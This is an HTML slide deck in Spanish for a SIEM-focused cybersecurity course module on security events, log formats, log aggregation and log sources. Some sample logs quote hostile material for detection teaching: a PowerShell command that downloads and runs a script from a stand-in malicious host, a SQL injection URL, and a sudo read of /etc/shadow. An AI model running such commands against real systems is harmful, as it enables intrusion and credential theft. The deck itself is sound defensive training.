@@ -1,0 +1,788 @@
+
+  <!DOCTYPE html>
+  <html>
+    <head>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/reveal.min.css" />
+				  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/theme/dracula.min.css" id="theme" />
+    </head>
+    <body>
+    <div class="reveal">
+      <div class="slides" style="font-size: 36px">
+     <section data-markdown data-separator="---">
+       <script type="text/template">
+          
+# Módulo 2: Eventos y Logs
+### Curso de Ciberseguridad con Enfoque SIEM
+
+---
+
+## Contenidos del Módulo
+
+- **Unidad 1**: Fundamentos de eventos y logs de seguridad
+- **Unidad 2**: Agregación y procesamiento de logs
+- **Unidad 3**: Fuentes de logs y eventos
+
+---
+
+# Unidad 1: Fundamentos de eventos y logs de seguridad
+
+---
+
+## ¿Qué son los logs de seguridad?
+
+- **Definición**: Registros digitales que documentan eventos relacionados con la seguridad dentro de un sistema o infraestructura de red
+- **Función principal**: Proporcionan evidencia para monitoreo, investigación y análisis forense
+- **Característica clave**: Permiten la trazabilidad de acciones y eventos en sistemas informáticos
+
+---
+
+## Anatomía de un evento de seguridad
+
+- **Timestamp**: Fecha y hora exacta del evento
+- **Origen**: Sistema, aplicación o dispositivo que generó el evento
+- **Tipo de evento**: Categoría del evento (autenticación, acceso, etc.)
+- **Severidad**: Nivel de importancia o gravedad del evento
+- **Usuario/Entidad**: Identidad asociada con la actividad
+- **Detalles del evento**: Información específica sobre lo ocurrido
+- **Dirección IP/Ubicación**: Origen y destino de la actividad en la red
+- **Resultado**: Éxito o fracaso del evento (ej. autenticación exitosa o fallida)
+
+---
+
+## Diferencia entre eventos e incidentes
+
+**Eventos de seguridad**:
+- Cualquier ocurrencia observable en un sistema o red
+- Generados constantemente (millones al día)
+- Mayoría son benignos y rutinarios
+- Ejemplos: Inicios de sesión, cambios de configuración, accesos a archivos
+
+**Incidentes de seguridad**:
+- Eventos o conjunto de eventos que indican una amenaza real
+- Requieren intervención y respuesta
+- Representan una violación de políticas o compromisos de seguridad
+- Ejemplos: Infección por malware, acceso no autorizado, fuga de datos
+
+---
+
+## Eventos comunes con relevancia para seguridad
+
+- Intentos de autenticación fallidos repetidos
+- Cambios en privilegios de usuario
+- Inicios de sesión desde ubicaciones o horarios inusuales
+- Ejecución de comandos o procesos sospechosos
+- Detecciones de malware o código malicioso
+- Tráfico de red hacia/desde direcciones IP maliciosas
+- Actividad anormal en bases de datos o sistemas críticos
+- Modificaciones no autorizadas de archivos del sistema
+
+---
+
+## Incidentes comunes de seguridad
+
+- Correos maliciosos recibidos y activados por usuarios
+- Acceso a sitios web maliciosos (ej. descarga drive-by)
+- Uso inadecuado o prohibido por un usuario autorizado
+- Acceso no autorizado a sistemas
+- Intento de comprometer, denegar acceso o eliminar sistemas
+- Pérdida o robo de equipos (portátiles, servidores)
+- Fuga de datos o infección por malware vía medios extraíbles
+
+---
+
+## Tipos de logs relevantes para seguridad
+
+- **Logs de autenticación**: Registro de intentos de acceso (exitosos y fallidos)
+- **Logs de auditoría**: Registro de acciones de usuarios privilegiados
+- **Logs de red**: Tráfico entre dispositivos y sistemas
+- **Logs de sistema**: Eventos del sistema operativo (arranque, apagado, errores)
+- **Logs de aplicaciones**: Eventos específicos de aplicaciones
+- **Logs de seguridad**: Generados por soluciones de seguridad (antivirus, firewall, IDS)
+- **Logs de cambios**: Modificaciones en archivos o configuraciones
+
+---
+
+## Formatos comunes de logs: CSV
+
+### Comma-Separated Values (CSV)
+- Formato simple y común
+- Datos separados por comas
+- Fácil de procesar y analizar
+- Consumo eficiente de espacio
+
+**Ejemplo**:
+```
+5:39:55,[Fname,Lname,name@company],Sign-in Failed,173.0.0.0,/app/office365
+```
+
+---
+
+## Formatos comunes de logs: JSON
+
+### JavaScript Object Notation (JSON)
+- Estructura jerárquica de datos
+- Muy utilizado en aplicaciones web y APIs
+- Soporta diferentes tipos de datos
+- Fácil de leer para humanos y máquinas
+
+**Ejemplo**:
+```json
+{
+  "timestamp": "2023-06-15T14:22:33Z",
+  "user": "jsmith",
+  "event": "authentication",
+  "result": "success",
+  "source_ip": "192.168.1.45",
+  "location": "New York"
+}
+```
+
+---
+
+## Formatos comunes de logs: CEF
+
+### Common Event Format (CEF)
+- Estándar abierto desarrollado por ArcSight
+- Facilita el intercambio de datos entre dispositivos
+- Formato estructurado con campos predefinidos
+- Extensible para incluir datos específicos
+
+**Estructura básica**:
+```
+CEF:Version|Vendor|Product|Version|SignatureID|Name|Severity|Extension
+```
+
+**Ejemplo**:
+```
+CEF:0|Trend Micro|Deep Security|3.5.4|600|Authentication|4|suser=Master src=10.0.0.1
+```
+
+---
+
+## Formatos comunes de logs: Syslog
+
+### Syslog
+- Estándar para envío de mensajes de logs en redes
+- Utilizado principalmente en sistemas Unix/Linux
+- Incluye prioridad, facilidad, severidad y mensaje
+- RFC 5424 define el formato moderno
+
+**Ejemplo**:
+```
+<34>1 2023-06-15T14:22:33Z host app 2986 - - Login successful for user 'admin' from 192.168.1.100
+```
+
+---
+
+# Unidad 2: Agregación y procesamiento de logs
+
+---
+
+## ¿Qué es la agregación de logs?
+
+- Proceso de recolección, centralización y organización de datos de logs de múltiples fuentes
+- Consolida información dispersa en un único repositorio
+- Facilita la correlación, búsqueda y análisis
+- Componente fundamental de los sistemas SIEM
+- Permite una visión holística de la seguridad organizacional
+
+---
+
+## Métodos de recolección de logs
+
+### 1. Agentes (Push)
+- Software instalado en dispositivos de origen
+- Recopila, filtra y envía logs al servidor central
+- Permite preprocesamiento local
+- Ejemplo: Beats de Elastic Stack, Splunk Forwarders
+
+### 2. Agentless (Pull)
+- El servidor central extrae logs directamente
+- No requiere software adicional en dispositivos
+- Utiliza protocolos estándar (SSH, WMI, API)
+- Menor sobrecarga en dispositivos de origen
+
+---
+
+## Métodos de recolección de logs (cont.)
+
+### 3. Syslog
+- Protocolo estándar para transmisión de logs
+- UDP (RFC 3164) o TCP (RFC 5424)
+- Ampliamente soportado en dispositivos de red
+- Ideal para recopilación en tiempo real
+
+### 4. Transferencia directa de archivos
+- Copia de archivos de log vía SFTP, SCP, etc.
+- Útil para sistemas que no soportan otros métodos
+- Puede involucrar procesamiento por lotes
+- Menos inmediato que otros métodos
+
+---
+
+## Métodos de recolección de logs (cont.)
+
+### 5. APIs y webhooks
+- Integración directa con aplicaciones
+- Permite acceso a datos estructurados
+- Ideal para servicios cloud y SaaS
+- Ejemplos: API REST, GraphQL, SOAP
+
+### 6. Protocolos de monitoreo de red
+- Captura de flujos de tráfico de red
+- SNMP, NetFlow, IPFIX, sFlow
+- Proporciona visibilidad de actividad de red
+- Complementa logs de aplicación y sistema
+
+---
+
+## Procesamiento de logs: Parsing
+
+- Proceso de extraer información estructurada de logs en formato bruto
+- Convierte texto sin formato en campos y valores discretos
+- Identifica patrones recurrentes en logs de diferentes sistemas
+- Utiliza expresiones regulares y técnicas de análisis sintáctico
+- Desafío: cada sistema genera logs en formatos diferentes
+- Los SIEM incluyen cientos de parsers predefinidos para sistemas comunes
+
+---
+
+## Normalización y enriquecimiento de datos
+
+### Normalización
+- Convertir logs heterogéneos a un formato estándar
+- Unificar nombres de campos (ej. "src_ip", "source_ip", "ipaddr" → "source_address")
+- Estandarizar formatos de fecha/hora
+- Categorizar eventos en tipos predefinidos
+- Facilita correlación entre eventos de diferentes fuentes
+
+### Enriquecimiento
+- Añadir contexto y valor a los datos de logs
+- Ejemplos: geolocalización de IPs, reputación de dominios, categorización de URLs
+- Incorporación de inteligencia de amenazas
+- Adición de información de activos y usuarios
+
+---
+
+## Ejemplo de normalización y enriquecimiento
+
+**Log original (Firewall):**
+```
+Jun 15 14:22:33 fw1 connection blocked src=198.51.100.1:4532 dst=10.0.0.5:443 proto=TCP
+```
+
+**Log original (Servidor web):**
+```
+198.51.100.1 - - [15/Jun/2023:14:22:35 +0000] "GET /admin HTTP/1.1" 403 287
+```
+
+**Después de normalización y enriquecimiento:**
+```json
+{
+  "timestamp": "2023-06-15T14:22:33Z",
+  "event_type": "connection_blocked",
+  "source_ip": "198.51.100.1",
+  "source_port": 4532,
+  "destination_ip": "10.0.0.5",
+  "destination_port": 443,
+  "protocol": "TCP",
+  "geo_location": "Russia",
+  "threat_intel": "Known malicious IP (Botnet C&C)",
+  "asset_info": "Finance Web Server"
+}
+```
+
+---
+
+## Indexación para acceso rápido
+
+- Proceso de crear estructuras de datos optimizadas para búsquedas
+- Similar a índices en libros o bases de datos
+- Permite consultas casi instantáneas sobre grandes volúmenes
+- Tipos:
+  - Índices invertidos (texto completo)
+  - Índices basados en tiempo
+  - Índices geoespaciales
+  - Índices de términos específicos (usuarios, IPs, etc.)
+- Tecnologías: Elasticsearch, Lucene, etc.
+
+---
+
+## Gestión de grandes volúmenes de datos
+
+### Desafíos
+- Volúmenes masivos (TB/PB por día en grandes organizaciones)
+- Velocidad de ingesta (millones de eventos por segundo)
+- Retención a largo plazo (regulaciones exigen años)
+- Costos de almacenamiento
+- Rendimiento de consultas
+
+### Soluciones
+- Arquitecturas de data lake (S3, Hadoop, Elasticsearch)
+- Almacenamiento por niveles (hot/warm/cold)
+- Compresión y optimización de datos
+- Particionamiento y sharding
+- Políticas de retención y archivado
+
+---
+
+# Unidad 3: Fuentes de logs y eventos
+
+---
+
+## Logs de sistemas operativos (Windows)
+
+### Windows Event Logs
+- Principal sistema de logging en Windows
+- Accesible mediante Event Viewer
+- Categorías principales:
+  - **Application**: Eventos de aplicaciones
+  - **Security**: Eventos de seguridad (auditoría)
+  - **System**: Eventos del sistema operativo
+  - **Setup**: Instalación de componentes
+  - **Forwarded Events**: Eventos reenviados
+
+### Ejemplo de evento de seguridad de Windows
+```
+Account successfully logged in.
+Type: Success Audit
+Computer: WORKSTATION1
+Time: June 15, 2023 14:22:33
+User: DOMAIN\username
+Event ID: 4624
+```
+
+---
+
+## Logs de seguridad de Windows
+
+### Eventos de seguridad críticos
+- **Inicio de sesión (4624)**: Autenticación exitosa
+- **Inicio de sesión fallido (4625)**: Intento fallido
+- **Creación de cuenta (4720)**: Nueva cuenta creada
+- **Cambio de grupo (4728-4738)**: Modificaciones en grupos
+- **Ejecución de servicio (7045)**: Instalación de servicio
+- **Cambio de política (4719)**: Modificación de política
+
+### PowerShell Logging
+- **Transcripción**: Registro de comandos y salida
+- **Script Block**: Registro de scripts ejecutados
+- **Module Logging**: Registro de módulos cargados
+- Importante para detectar ataques basados en PowerShell
+
+---
+
+## Logs de sistemas operativos (Linux)
+
+### Principales archivos de log en Linux
+- **/var/log/auth.log** o **/var/log/secure**: Autenticación y seguridad
+- **/var/log/messages** o **/var/log/syslog**: Mensajes del sistema
+- **/var/log/kern.log**: Mensajes del kernel
+- **/var/log/audit/audit.log**: Registros de auditoría
+- **/var/log/apache2/** o **/var/log/httpd/**: Logs de servidor web
+- **/var/log/faillog**: Intentos de login fallidos
+
+### Journald
+- Sistema de logs moderno en distribuciones con systemd
+- Logs estructurados y binarios (no texto plano)
+- Accesibles mediante comando `journalctl`
+
+---
+
+## Ejemplo de logs Linux críticos para seguridad
+
+**Autenticación fallida (SSH)**
+```
+Jun 15 14:22:33 server sshd[12345]: Failed password for invalid user admin from 198.51.100.1 port 54321 ssh2
+```
+
+**Elevación de privilegios (sudo)**
+```
+Jun 15 14:22:33 server sudo: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/cat /etc/shadow
+```
+
+**Modificación de archivo crítico**
+```
+Jun 15 14:22:33 server audit[12345]: SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0=7ffcb3595d0c a1=0 a2=1fffffffffff0000 a3=0 items=1 ppid=12344 pid=12345 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="nano" exe="/usr/bin/nano" key="etc-shadow-write"
+```
+
+---
+
+## Logs de seguridad de red: Firewalls
+
+### Información registrada típicamente
+- Timestamp
+- Acción (permitir/denegar)
+- Dirección IP de origen y destino
+- Puertos de origen y destino
+- Protocolo (TCP, UDP, ICMP)
+- Interfaz de entrada/salida
+- Regla aplicada
+- Bytes transferidos
+
+### Ejemplos de implementaciones
+- **Cisco ASA/Firepower**
+- **Check Point**
+- **Palo Alto Networks**
+- **Fortinet FortiGate**
+- **pfSense/OPNsense**
+- **Windows Firewall**
+- **iptables/nftables (Linux)**
+
+---
+
+## Ejemplo de log de firewall
+
+**Cisco ASA**
+```
+Jun 15 2023 14:22:33 ASA-FW %ASA-4-106023: Deny tcp src outside:198.51.100.1/54321 dst inside:10.0.0.5/443 by access-group "outside_access_in"
+```
+
+**Check Point**
+```
+15Jun2023 14:22:33 192.0.2.1 CheckPoint[12345]: |action=Drop|orig=198.51.100.1|orig_port=54321|dest=10.0.0.5|dest_port=443|proto=TCP|rule=5|
+```
+
+**iptables (Linux)**
+```
+Jun 15 14:22:33 fw kernel: [12345.678901] DROP IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=198.51.100.1 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=443 WINDOW=29200 RES=0x00 SYN URGP=0
+```
+
+---
+
+## Logs de seguridad de red: IDS/IPS
+
+### Información registrada típicamente
+- Timestamp
+- ID de firma/regla
+- Clasificación de la alerta
+- Severidad
+- Direcciones IP y puertos
+- Protocolo
+- Contenido/payload del paquete
+- Contexto de la alerta
+
+### Ejemplos de implementaciones
+- **Snort/Suricata**
+- **Cisco Firepower**
+- **Palo Alto Networks Threat Prevention**
+- **Trend Micro TippingPoint**
+- **Darktrace**
+- **Check Point IPS**
+
+---
+
+## Ejemplo de log de IDS/IPS
+
+**Suricata (formato eve.json)**
+```json
+{
+  "timestamp": "2023-06-15T14:22:33.123456+0000",
+  "flow_id": 123456789,
+  "in_iface": "eth0",
+  "event_type": "alert",
+  "src_ip": "198.51.100.1",
+  "src_port": 54321,
+  "dest_ip": "10.0.0.5",
+  "dest_port": 443,
+  "proto": "TCP",
+  "alert": {
+    "action": "blocked",
+    "gid": 1,
+    "signature_id": 2034567,
+    "rev": 1,
+    "signature": "ET EXPLOIT Possible SQL Injection Attempt",
+    "category": "Web Application Attack",
+    "severity": 2
+  },
+  "http": {
+    "hostname": "www.example.com",
+    "url": "/login.php?user=admin'%20OR%201=1--",
+    "http_user_agent": "Mozilla/5.0",
+    "http_method": "GET",
+    "http_refer": "https://www.google.com/"
+  }
+}
+```
+
+---
+
+## Logs de aplicaciones y servicios
+
+### Servidores web
+- **Apache**: access.log, error.log
+- **Nginx**: access.log, error.log
+- **IIS**: W3C Extended Log Format
+
+### Servidores de bases de datos
+- **MySQL/MariaDB**: Error log, general query log, slow query log
+- **PostgreSQL**: postgresql.log
+- **MS SQL Server**: SQL Server logs, SQL Server Agent logs
+- **Oracle**: Alert log, listener log, audit log
+
+### Servidores de correo
+- **Exchange**: Application log, message tracking log
+- **Postfix**: mail.log, mail.err
+- **Sendmail**: maillog
+
+---
+
+## Logs de aplicaciones y servicios (cont.)
+
+### Servidores de autenticación
+- **Active Directory**: Security logs, DNS Server logs, DHCP logs
+- **LDAP**: OpenLDAP logs
+- **Radius**: Auth logs
+
+### Servidores DNS
+- **BIND**: named.log
+- **Windows DNS Server**: DNS logs en Event Viewer
+
+### Servidores proxy/VPN
+- **Squid**: access.log
+- **OpenVPN**: openvpn.log
+- **Cisco AnyConnect**: Logs en Event Viewer
+
+---
+
+## Ejemplo de logs de aplicaciones
+
+**Apache Web Server (access.log)**
+```
+198.51.100.1 - jsmith [15/Jun/2023:14:22:33 +0000] "GET /admin/config.php HTTP/1.1" 403 4891 "http://example.com/admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+```
+
+**MySQL Error Log**
+```
+2023-06-15T14:22:33.123456Z 12345 [Warning] Access denied for user 'root'@'198.51.100.1' (using password: YES)
+```
+
+**Active Directory (Event ID 4740)**
+```
+A user account was locked out.
+Subject:
+  Security ID: SYSTEM
+  Account Name: DC01$
+  Account Domain: EXAMPLE
+  Logon ID: 0x3e7
+Account That Was Locked Out:
+  Security ID: EXAMPLE\jsmith
+  Account Name: jsmith
+Additional Information:
+  Caller Computer Name: WORKSTATION1
+```
+
+---
+
+## Logs de infraestructura cloud y SaaS
+
+### Amazon Web Services (AWS)
+- **CloudTrail**: Actividad de la API y consola de administración
+- **VPC Flow Logs**: Tráfico de red
+- **S3 Access Logs**: Acceso a objetos en S3
+- **CloudWatch Logs**: Logs de aplicaciones y servicios
+- **GuardDuty**: Alertas de seguridad
+
+### Microsoft Azure
+- **Azure Activity Log**: Operaciones en recursos
+- **Azure AD Logs**: Autenticación y gestión de identidades
+- **Azure Security Center**: Alertas de seguridad
+- **Azure Network Watcher**: Tráfico de red
+- **Azure Storage Analytics**: Acceso a almacenamiento
+
+---
+
+## Logs de infraestructura cloud y SaaS (cont.)
+
+### Google Cloud Platform (GCP)
+- **Cloud Audit Logs**: Actividad de administración y acceso a datos
+- **VPC Flow Logs**: Tráfico de red
+- **Cloud Logging**: Logs de aplicaciones y servicios
+
+### Plataformas SaaS
+- **Microsoft 365**: Logs de Exchange Online, SharePoint, Teams, etc.
+- **Google Workspace**: Logs de Gmail, Drive, etc.
+- **Salesforce**: Logs de eventos, login history
+- **Dropbox/Box**: Logs de acceso y actividad
+- **Slack**: Logs de acceso y actividad
+
+---
+
+## Ejemplo de logs en entornos cloud
+
+**AWS CloudTrail**
+```json
+{
+  "eventVersion": "1.08",
+  "userIdentity": {
+    "type": "IAMUser",
+    "principalId": "AIDACKCEVSQ6C2EXAMPLE",
+    "arn": "arn:aws:iam::123456789012:user/jsmith",
+    "accountId": "123456789012",
+    "userName": "jsmith"
+  },
+  "eventTime": "2023-06-15T14:22:33Z",
+  "eventSource": "s3.amazonaws.com",
+  "eventName": "GetObject",
+  "awsRegion": "us-east-1",
+  "sourceIPAddress": "198.51.100.1",
+  "userAgent": "aws-cli/2.9.1",
+  "requestParameters": {
+    "bucketName": "example-bucket",
+    "key": "sensitive-data.zip"
+  },
+  "responseElements": null,
+  "resources": [
+    {
+      "ARN": "arn:aws:s3:::example-bucket/sensitive-data.zip",
+      "accountId": "123456789012",
+      "type": "AWS::S3::Object"
+    }
+  ],
+  "eventID": "abcdef12-3456-7890-abcd-ef1234567890",
+  "readOnly": true,
+  "eventType": "AwsApiCall",
+  "managementEvent": true,
+  "recipientAccountId": "123456789012"
+}
+```
+
+---
+
+## Logs de sistemas EDR (Endpoint Detection and Response)
+
+### Propósito y características
+- Monitoreo avanzado de actividad en endpoints
+- Detección de amenazas basada en comportamiento
+- Respuesta y contención automática
+- Visibilidad profunda en procesos, archivos y conexiones
+- Telemetría en tiempo real
+
+### Información registrada
+- Ejecución de procesos
+- Cambios en el registro y sistema de archivos
+- Conexiones de red
+- Carga y descarga de DLLs/módulos
+- Comportamientos sospechosos
+- Detecciones de amenazas
+
+---
+
+## Sistemas EDR comunes
+
+### Plataformas EDR populares
+- **CrowdStrike Falcon**
+- **Microsoft Defender for Endpoint**
+- **SentinelOne**
+- **Carbon Black**
+- **Sophos Intercept X**
+- **Symantec Endpoint Security**
+- **Trend Micro Apex One**
+- **McAfee MVISION EDR**
+- **Elastic Endpoint Security**
+- **Cybereason**
+
+---
+
+## Ejemplo de logs de EDR
+
+**Microsoft Defender for Endpoint**
+```json
+{
+  "timestamp": "2023-06-15T14:22:33.123456Z",
+  "eventType": "ProcessCreated",
+  "machineId": "abcdef12345678901234567890abcdef12345678",
+  "computerName": "WORKSTATION1",
+  "fileName": "cmd.exe",
+  "processId": 4567,
+  "parentProcessId": 1234,
+  "parentFileName": "powershell.exe",
+  "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')\"",
+  "commandLine": "cmd.exe /c whoami & net user & ipconfig /all",
+  "integrityLevel": "High",
+  "userSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+  "userName": "DOMAIN\\jsmith",
+  "logonId": 999999,
+  "logonType": 2,
+  "severity": "High",
+  "alertCategory": "CommandAndControl",
+  "detectionSource": "WindowsDefenderAtp"
+}
+```
+
+---
+
+## Integración de fuentes de logs en SIEM
+
+### Proceso de integración
+1. Identificar fuentes de logs críticas
+2. Priorizar fuentes basadas en valor de seguridad
+3. Configurar recolección (agentes, syslog, API)
+4. Desarrollar/adaptar parsers
+5. Normalizar formatos
+6. Configurar retención
+7. Implementar correlación
+8. Desarrollar casos de uso y reglas
+
+### Desafíos comunes
+- Diversidad de formatos
+- Volumen de datos
+- Mantenimiento de conectores
+- Cobertura de fuentes cloud/SaaS
+- Asegurar calidad de datos
+
+---
+
+## Mejores prácticas para gestión de logs
+
+- Definir una política clara de gestión de logs
+- Documentar todas las fuentes de logs
+- Priorizar fuentes basadas en criticidad
+- Asegurar sincronización temporal (NTP)
+- Implementar monitoreo de integridad de logs
+- Proteger logs contra manipulación
+- Configurar alertas para fallos en recolección
+- Establecer políticas de retención basadas en requisitos legales y operativos
+- Realizar auditorías periódicas de cobertura
+- Mantener actualizada la configuración de parsers
+
+---
+
+## Resumen del Módulo 2
+
+- **Unidad 1**: Comprendimos los fundamentos de eventos y logs de seguridad, su anatomía, y los formatos comunes.
+- **Unidad 2**: Exploramos los procesos de agregación, normalización, enriquecimiento e indexación de logs.
+- **Unidad 3**: Analizamos las diversas fuentes de logs desde sistemas operativos hasta infraestructura cloud y herramientas EDR.
+
+### Conocimientos clave adquiridos
+- Diferenciación entre eventos e incidentes de seguridad
+- Identificación de formatos de logs relevantes
+- Métodos de procesamiento y agregación de logs
+- Características de los logs en diferentes plataformas
+- Importancia de la integración de fuentes diversas en SIEM
+
+        </script>
+      </section>
+      </div>
+      </div>
+
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/reveal.min.js"></script>
+				     <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/plugin/markdown/markdown.min.js"></script>
+				     <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/plugin/highlight/highlight.min.js"></script>
+				     <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.2.1/plugin/math/math.min.js"></script>
+      <script>
+       Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				plugins: [ RevealMarkdown, RevealHighlight, RevealMath.KaTeX ]
+			});
+
+      </script>
+      <script>
+       window.parent.postMessage({ action: "ready" }, "*");
+      </script>
+    </body>
+  </html>
